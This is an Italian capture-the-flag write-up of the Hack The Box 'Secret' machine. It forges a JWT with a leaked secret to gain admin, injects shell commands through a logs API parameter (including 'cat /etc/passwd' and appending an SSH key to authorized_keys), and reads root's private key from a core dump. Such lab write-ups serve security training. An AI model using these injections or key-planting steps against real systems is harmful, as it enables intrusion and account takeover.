# HTB-Secret-WriteUp
Write Up of HTB machine: Secret

Prima di poter connettersi ad una macchina di HTB è necessario scaricare il certificato della VPN dalla dashboard ed utilizzare OpenVPN:

**$openvpn [file.ovpn]**

![image](https://user-images.githubusercontent.com/65173648/150963493-27b74dcf-dc73-4008-952e-20b67bcf793f.png)

Effettuo lo scanning (fase in cui cerchiamo di raccogliere quante più informazioni possibili dall'host):

**$nmap -sS -p- -T4 -Pn -oA portScan [IP target]**

![image](https://user-images.githubusercontent.com/65173648/150964450-75c5a322-0788-4eea-85b4-93f372503525.png)

Effettuo l'enumeration (fase in cui cerchiamo di approndire le informazioni andando ad enumerare le porte trovare in fase di scansione):

**nmap -sV -sC –p [porte trovate separate da virgola] -oA versionScan [IP target]**

![image](https://user-images.githubusercontent.com/65173648/150964922-e59aae36-22f5-4b6a-901e-a12fc41d63b6.png)

Si può notare, a prima vista, che sono presenti un web server su porta 80 e un'applicazione in Node.js su porta 3000, riportanti lo stesso titolo.

Applicazione Web:

![image](https://user-images.githubusercontent.com/65173648/150966584-c3ff72de-143a-469e-a062-19af3089a506.png)

Andando a spulciare il sito a mano e investigando nelle cartelle si notano dei path interessanti da approfondire. 

Utilizzo **gobuster** e mi salvo l'output dell'enumeration:

**$gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt dir -u [IP target] | tee WebEnumeration.txt**

![image](https://user-images.githubusercontent.com/65173648/150967244-a7e380ac-d6a0-42d9-8ec8-cae82fa97c08.png)

Uno dei path interessanti è **/api** (potenziale punto d'accesso alla macchina).

La sezione relativa alla documentazione dell'applicazione web presenta un esempio di login con "theadmin". Provo a creare un utetne con le stesse credenziali ma non va a buon fine:

**curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"name":"theadmin", "email":"drt@dasith.works", "password":"provaPassword"}' \
  http://10.10.11.120/api/user/register**

![image](https://user-images.githubusercontent.com/65173648/150968135-0f22d504-5734-4e5e-95d6-4d3c306383d0.png)

Decido di creare un utente personale e provare a bypassare la JWT validation dato che nel file routes/verifytoken.js è presente un algoritmo JWT non specificato:

(Se riesco a bypassare la JWT, da utente user potrei diventare admin.)

**curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"name":"m96dgHack", "email":"m96dg@hack.it", "password":"provaPassword"}' \
  http://10.10.11.120/api/user/register**

  
 ![image](https://user-images.githubusercontent.com/65173648/150968542-a24017bf-66d5-432d-9d0c-f06b4f17b31b.png)

Effettuo il login:

**curl -i -X POST \
  -H 'Content-Type: application/json' \
  -d '{"email":"m96dg@hack.it", "password":"provaPassword"}' \
  http://10.10.11.120/api/user/login**
  
  ![image](https://user-images.githubusercontent.com/65173648/150968638-7e7393da-04f2-4bc7-9bb9-8ae554e471e7.png)

Noto che mi viene generato un **AUTH-TOKEN** e me lo conservo.

All'interno delle cartelle c'è un file .env che fa riferimento ad un TOKEN_SECRET.

Utilizzando jwt.io si può notare come sia presente una voce "secret" in basso a destra, ossia un box dove inserire il token segreto dalla "history" della cartella .git. Il token secret del file .env non è quello giusto.

Seguire i comandi degli screen che seguono:

![image](https://user-images.githubusercontent.com/65173648/150969681-588a871c-28ba-43b6-a282-2c5c7d5b3bda.png)

![image](https://user-images.githubusercontent.com/65173648/150969704-33da6ee3-3d66-43fe-a881-d65dd8dabf66.png)

![image](https://user-images.githubusercontent.com/65173648/150969732-50fdf5ba-28e3-4c14-a68a-51123f33cdc0.png)

Conservare il TOKEN_SECRET ed utilizzarlo in combo con l'AUTH-TOKEN.

La combinazione AUTH-TOKEN + TOKEN_SECRET darà luogo al nuovo token decriptato da inserire per accedere come admin (prima, però, bisogna modificare il "name" da "m96dgHack" in "theadmin").

![image](https://user-images.githubusercontent.com/65173648/150970069-d94737c6-af0e-401a-ad78-305b3dd6d10b.png)

Arrivato a questo punto, mi incuriosisce sapere se posso effettivamente sfruttare le api sia come user sia come admin (utilizzo AUTH-TOKEN e token decriptato):

**curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoibTk2ZGdIYWNrIiwiZW1haWwiOiJtOTZkZ0BoYWNrLml0IiwiaWF0IjoxNjQxNjQzMDI5fQ.l8Abgxt-ECwkhofDuNU08KoUIPAvSY8E8IZkqXUdg6c' \
  http://10.10.11.120/api/priv**
  
  ![image](https://user-images.githubusercontent.com/65173648/150971154-b2bbb366-ad32-4158-8158-b73e45fa89af.png)

  
 **curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ' \
  http://10.10.11.120/api/priv**
  
  ![image](https://user-images.githubusercontent.com/65173648/150971181-eff13e84-1a28-4f8e-874a-4a798b255a59.png)

Sfrutto le api per leggere il file di logs:

**curl -i \
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
  ' \
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'**
  
 Noto l'utente "dasith" e provo ad accedere in ssh, ricordandomi le porte scansionate (porta 22 aperta).
 
 Creo una coppia di chiavi ssh e copio la mia chiave pubblica all'interno del server così da poter sfruttare la connessione in ssh:
 
 **ssh-keygen -t rsa -f secret.htb -P ''**
 
 ![image](https://user-images.githubusercontent.com/65173648/150971755-ebbbeecd-b0dc-45ff-b667-a1a3581bb317.png)

![image](https://user-images.githubusercontent.com/65173648/150971768-7dbbe444-9f5b-489e-91eb-9e64a46c9d17.png)

![image](https://user-images.githubusercontent.com/65173648/150971800-84475b47-5ffd-4f71-8545-1804a76dbb5c.png)

 
**curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
' -G 'http://10.10.11.120/api/logs' --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys"**

Una volta loggato in ssh, ho ottenuto l'accesso come utente di sistema e ricavo la flag user.txt:

 ![extra_flag_user](https://user-images.githubusercontent.com/65173648/150972236-60828c9b-c848-46fd-9163-0456f942bf2b.PNG)


Ottenuta la user flag, procedo con la **privilege escalation** (fase in cui si sfrutta l'utente di sistema per accedere all'utente root con permessi di amministratore).

Cerco di sfruttare al meglio i path a cui può accedere l'user, e noto il path /opt, in cui sono presenti 3 file interessanti (di cui 1 compilato).

Decido di runnare il file e provare ad accedere con i permessi di root:

![20_run_count](https://user-images.githubusercontent.com/65173648/150973629-7956f73a-f0c9-4bdf-995e-71375f97fc01.PNG)

Nulla di interessante!

Leggendo il file valgrind.log noto che c'è un riferimento alla memoria e decido di sfruttare il Core Dump (eseguo il programma e lo induco al crash):

![22_coredump_crash](https://user-images.githubusercontent.com/65173648/150974294-45be22c0-ea87-4679-a937-5ca3a270fced.PNG)

![23_sigsegv](https://user-images.githubusercontent.com/65173648/150974320-b7c989e2-6633-4ea1-91f9-861e5fa9c51c.PNG)


**$apport-unpack_opt_count.1000.crash /tmp/crash-report**

![24_reports](https://user-images.githubusercontent.com/65173648/150974637-1cbce728-01b3-47e3-9da8-0f5cb014e4eb.PNG)

Sfrutto **strings** per CoreDump:

![25_strings_coredump](https://user-images.githubusercontent.com/65173648/150974709-b202ed57-54dd-4d6b-98b3-18af75c4a9b7.PNG)

Dato che ottengo dei risultati importanti, decido di sfruttare lo stesso metodo con /root/.ssh/id_rsa e provare ad accedere alla chiave privata di root:

![26_crasf_for_idrsa](https://user-images.githubusercontent.com/65173648/150974882-372aeb35-7991-4782-b48c-61b1fdbdb83f.PNG)

E' possibile copiare la chiave privata di root dai risultati e provare ad accedere in ssh con essa:

![extra_root_user](https://user-images.githubusercontent.com/65173648/150975112-b57dbda8-cf9b-4915-8897-9aa899a811fe.PNG)

Una volta che si inseriscono le due flag in HTB, il gioco è fatto!

![28_pwned](https://user-images.githubusercontent.com/65173648/150975209-def9973c-d6a4-4a35-8763-4665c02dd33d.PNG)







